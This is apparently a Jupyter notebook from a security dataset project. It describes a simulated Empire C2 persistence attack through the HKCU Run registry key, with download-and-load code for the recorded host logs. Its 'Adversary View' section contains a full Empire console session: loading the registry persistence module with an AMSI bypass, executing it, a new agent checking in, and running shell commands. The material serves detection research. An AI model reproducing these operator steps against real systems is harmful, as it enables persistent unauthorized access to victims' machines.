{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2ce1a573",
   "metadata": {},
   "source": [
    "# Empire Userland Registry Run Keys"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "932d4fce",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "01245641",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/03/19 |\n",
    "| Modification Date | 2020/09/04 |\n",
    "| Tactics           | [TA0003](https://attack.mitre.org/tactics/TA0003) |\n",
    "| Techniques        | [T1547.001](https://attack.mitre.org/techniques/T1547/001) |\n",
    "| Tags              | Local Registry Modification,Registry Run Keys |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "736eeab8",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries modifying local Run registry keys (i.e. HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) for persistence. It also captures the execution of the persistence mechanism."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "487d5bb5",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "433de30f",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_persistence_registry_modification_run_keys_standard_user.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_persistence_registry_modification_run_keys_standard_user.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "445f0539",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "78f7687c",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4b344582",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [Registry](https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "68ab00ab",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: stager/multi/launcher) > \n",
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:02:57  http            \n",
    "\n",
    "(Empire: agents) > interact KU86XWEL\n",
    "(Empire: KU86XWEL) > \n",
    "(Empire: KU86XWEL) > usemodule persistence/\n",
    "elevated/registry*                 misc/add_netuser                   misc/install_ssp*                  powerbreach/resolver\n",
    "elevated/rid_hijack*               misc/add_sid_history*              misc/memssp*                       userland/backdoor_lnk\n",
    "elevated/schtasks*                 misc/debugger*                     misc/skeleton_key*                 userland/registry\n",
    "elevated/wmi*                      misc/disable_machine_acct_change*  powerbreach/deaduser               userland/schtasks\n",
    "elevated/wmi_updater*              misc/get_ssps                      powerbreach/eventlog*              \n",
    "(Empire: KU86XWEL) > usemodule persistence/userland/registry\n",
    "(Empire: powershell/persistence/userland/registry) > info\n",
    "\n",
    "              Name: Invoke-Registry\n",
    "            Module: powershell/persistence/userland/registry\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @mattifestation\n",
    "  @harmj0y\n",
    "  @enigma0x3\n",
    "\n",
    "Description:\n",
    "  Persist a stager (or script) via the\n",
    "  HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry\n",
    "  key. This has an easy detection/removal rating.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n",
    "  rsistence/Persistence.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        KU86XWEL                  Agent to run module on.                 \n",
    "  Listener         False                                 Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  KeyName          True        Updater                   Key name for the run trigger.           \n",
    "  RegPath          False       HKCU:Software\\Microsoft\\  Registry location to store the script   \n",
    "                              Windows\\CurrentVersion\\D  code. Last element is the key name.     \n",
    "                              ebug                    \n",
    "  ADSPath          False                                 Alternate-data-stream location to store \n",
    "                                                        the script code.                        \n",
    "  EventLogID       False                                 Store the script in the Application     \n",
    "                                                        event log under the specified EventID.  \n",
    "                                                        The ID needs to be unique/rare!         \n",
    "  ExtFile          False                                 Use an external file for the payload    \n",
    "                                                        instead of a stager.                    \n",
    "  Cleanup          False                                 Switch. Cleanup the trigger and any     \n",
    "                                                        script from specified location.         \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/persistence/userland/registry) > set Listener http\n",
    "(Empire: powershell/persistence/userland/registry) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked KU86XWEL to run TASK_CMD_WAIT\n",
    "[*] Agent KU86XWEL tasked with task ID 1\n",
    "[*] Tasked agent KU86XWEL to run module powershell/persistence/userland/registry\n",
    "(Empire: powershell/persistence/userland/registry) > \n",
    "Registry persistence established using listener http stored in HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Debug.\n",
    "\n",
    "(Empire: powershell/persistence/userland/registry) > \n",
    "(Empire: powershell/persistence/userland/registry) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent SP7B3U2X checked in\n",
    "[+] Initial agent SP7B3U2X from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to SP7B3U2X at 172.18.39.5\n",
    "\n",
    "(Empire: powershell/persistence/userland/registry) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            \n",
    "SP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         1376   5/0.0    2020-09-04 07:09:04  http            \n",
    "\n",
    "(Empire: agents) > interact SP7B3U2X\n",
    "(Empire: SP7B3U2X) > shell whoami\n",
    "[*] Tasked SP7B3U2X to run TASK_SHELL\n",
    "[*] Agent SP7B3U2X tasked with task ID 1\n",
    "(Empire: SP7B3U2X) > \n",
    "theshire\\pgustavo\n",
    "..Command execution completed.\n",
    "\n",
    "    (Empire: SP7B3U2X) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "010e4a4d",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "243f53e8",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0f9cf8b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_persistence_registry_modification_run_keys_standard_user.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c26e6fe7",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "05dd73ab",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7f7d2fd9",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cc36f0f1",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "234f3234",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://docs.microsoft.com/en-us/windows/win32/netmgmt/user-functions](https://docs.microsoft.com/en-us/windows/win32/netmgmt/user-functions) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
